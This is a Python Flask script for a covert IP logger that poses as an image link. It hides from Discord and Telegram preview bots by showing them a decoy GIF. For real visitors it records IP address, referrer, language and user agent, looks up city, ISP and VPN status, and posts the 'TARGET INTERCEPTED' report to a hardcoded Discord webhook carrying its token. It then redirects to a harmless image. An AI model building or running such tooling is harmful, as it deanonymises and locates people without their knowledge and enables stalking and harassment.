import os
import requests
from flask import Flask, request, redirect, send_file
import io
from datetime import datetime

app = Flask(__name__)

# YOUR SECURE WEBHOOK
WEBHOOK_URL = "https://discord.com/api/webhooks/1499375993515802814/k7NlaKYQ6E9E89EvLFXmqYmQHzSldINIRkq3CZB2JqImHP4ROw7Wa2qbjLtFhgitQmKe"

@app.route('/view/image_01.png')
def logger():
    ua_string = request.user_agent.string
    user_agent_low = ua_string.lower()
    
    # 1. BOT FILTER / MASKING
    # If Discord or Telegram bots try to scan the link, show the "Troll Loading" GIF
    if any(bot in user_agent_low for bot in ["discord", "telegram", "bot", "crawl", "spider"]):
        r = requests.get("https://media1.tenor.com/m/ziNSDDTCyiwAAAAC/discord-trolling.gif")
        return send_file(io.BytesIO(r.content), mimetype='image/gif')

    # 2. DATA ACQUISITION
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in user_ip: user_ip = user_ip.split(',')[0] # Clean multi-IP headers
    
    referrer = request.referrer or "Direct Link / Typed"
    lang = request.accept_languages.best or "Unknown"
    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")

    # Deep Geo & Network Lookup (ip-api.com)
    city, region, country, isp, org, as_info, mobile, proxy = "??", "??", "??", "??", "??", "??", "??", "??"
    try:
        # Requesting ALL fields: status, message, country, regionName, city, zip, lat, lon, timezone, isp, org, as, mobile, proxy, hosting, query
        geo = requests.get(f"http://ip-api.com/json/{user_ip}?fields=66846719").json()
        if geo['status'] == 'success':
            city = geo.get('city', 'Unknown')
            region = geo.get('regionName', 'Unknown')
            country = geo.get('country', 'Unknown')
            isp = geo.get('isp', 'Unknown')
            org = geo.get('org', 'Unknown')
            as_info = geo.get('as', 'Unknown')
            mobile = "✅ Yes" if geo.get('mobile') else "❌ No"
            proxy = "⚠️ YES (VPN/Proxy/Hosting)" if geo.get('proxy') or geo.get('hosting') else "✅ No (Residential)"
    except:
        pass

    # 3. CONSTRUCTING THE INTELLIGENCE EMBED
    payload = {
        "username": "Project Alpha: Intelligence",
        "avatar_url": "https://i.imgur.com/8N76f9J.png",
        "embeds": [{
            "title": "📡 TARGET INTERCEPTED: DATA DUMP",
            "description": f"Target was referred by: **{referrer}**",
            "color": 15548997, # Crimson Red
            "fields": [
                {"name": "🌍 Geolocation", "value": f"**City:** {city}\n**Region:** {region}\n**Country:** {country}", "inline": True},
                {"name": "🌐 Network Data", "value": f"**ISP:** {isp}\n**Org:** {org}\n**AS:** {as_info}", "inline": True},
                {"name": "🛡️ Security Check", "value": f"**Mobile Data:** {mobile}\n**VPN/Proxy:** {proxy}", "inline": False},
                {"name": "🕵️ Identity", "value": f"**IP:** `{user_ip}`\n**Lang:** `{lang}`", "inline": True},
                {"name": "⏰ Timestamp", "value": f"`{time_now}`", "inline": True},
                {"name": "📱 Device Fingerprint", "value": f"```{ua_string}```", "inline": False}
            ],
            "footer": {"text": "Unauthorized Access Detected | Alpha-v4-Final"},
            "thumbnail": {"url": "https://media1.tenor.com/m/ziNSDDTCyiwAAAAC/discord-trolling.gif"}
        }]
    }
    
    # Send to Webhook
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass

    # 4. THE REDIRECT (The "Safe" Image)
    return redirect("https://i.imgur.com/BcNs5vF.jpg")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
